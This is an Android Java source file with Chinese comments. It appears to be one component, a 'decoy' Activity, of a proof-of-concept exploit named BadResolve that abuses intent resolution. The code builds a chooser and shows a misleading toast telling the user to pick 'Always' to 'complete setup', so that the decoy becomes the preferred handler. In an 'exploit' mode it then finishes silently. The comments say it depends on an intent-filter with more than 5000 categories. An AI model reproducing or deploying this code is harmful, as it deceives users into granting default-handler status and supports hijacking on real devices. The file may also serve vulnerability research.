package com.cfks.badresolve;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

/**
 * 诱饵 Activity
 * 
 * 需要配合 5000+ categories 的 intent-filter
 * 用户点击 "Always" 后，此 Activity 成为首选目标
 * 
 * Intent filter 必须声明:
 * - action: android.intent.action.VIEW
 * - category: android.intent.category.DEFAULT
 * - category: android.intent.category.BROWSABLE  
 * - data: scheme="badresolve", host="setup"
 */
public class DecoyActivity extends Activity {
    
    private static final String TAG = "DecoyActivity";
    
    // 自定义 scheme
    public static final String CUSTOM_SCHEME = "badresolve";
    public static final String SETUP_HOST = "setup";
    public static final String EXPLOIT_HOST = "exploit";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.d(TAG, "DecoyActivity created");
        Log.d(TAG, "Intent: " + getIntent());
        Log.d(TAG, "Intent Data: " + getIntent().getData());
        Log.d(TAG, "Intent Action: " + getIntent().getAction());
        
        // 解析 intent data
        Uri data = getIntent().getData();
        
        // 检查是否是首选设置模式
        if (getIntent().hasExtra("setup_preferred")) {
            setupPreferredMode();
            return;
        }
        
        // 根据 scheme/host 处理不同行为
        if (data != null && CUSTOM_SCHEME.equals(data.getScheme())) {
            String host = data.getHost();
            
            if (SETUP_HOST.equals(host)) {
                // 设置模式 - 让用户选择 Always
                setupPreferredMode();
                return;
            } else if (EXPLOIT_HOST.equals(host)) {
                // Exploit 模式 - 静默关闭
                Log.d(TAG, "Exploit mode - finishing silently");
                finish();
                return;
            }
        }
        
        // 正常启动模式 - 静默关闭
        Log.d(TAG, "Normal mode - finishing silently");
        finish();
    }
    
    private void setupPreferredMode() {
        Log.i(TAG, "DecoyActivity in setup mode - prompting user to set as default");
        
        // 创建 chooser intent，让用户选择 Always
        Intent chooserIntent = new Intent(Intent.ACTION_VIEW);
        chooserIntent.setData(Uri.parse(CUSTOM_SCHEME + "://" + EXPLOIT_HOST + "/setup"));
        chooserIntent.addCategory(Intent.CATEGORY_DEFAULT);
        chooserIntent.addCategory(Intent.CATEGORY_BROWSABLE);
        
        // 使用 createChooser 强制显示选择器
        Intent wrapper = Intent.createChooser(chooserIntent, "Select default action for BadResolve");
        wrapper.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        
        try {
            startActivity(wrapper);
        } catch (Exception e) {
            Log.e(TAG, "Failed to show chooser", e);
            // 备用方案：直接显示 Toast 提示
            Toast.makeText(this, 
                "Please go to Settings > Apps > Default apps to set this app as default", 
                Toast.LENGTH_LONG
            ).show();
        }
        
        // 显示提示
        Toast.makeText(this, 
            "Please select 'Always' to complete setup", 
            Toast.LENGTH_LONG
        ).show();
        
        // 延迟关闭
        new android.os.Handler().postDelayed(() -> {
            if (!isFinishing()) {
                finish();
            }
        }, 5000);
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        Log.d(TAG, "onNewIntent: " + intent);
        
        // 重新处理 intent
        Uri data = intent.getData();
        if (data != null && CUSTOM_SCHEME.equals(data.getScheme())) {
            String host = data.getHost();
            if (EXPLOIT_HOST.equals(host)) {
                // Exploit 过程中被系统调用，静默关闭
                finish();
            }
        }
    }
}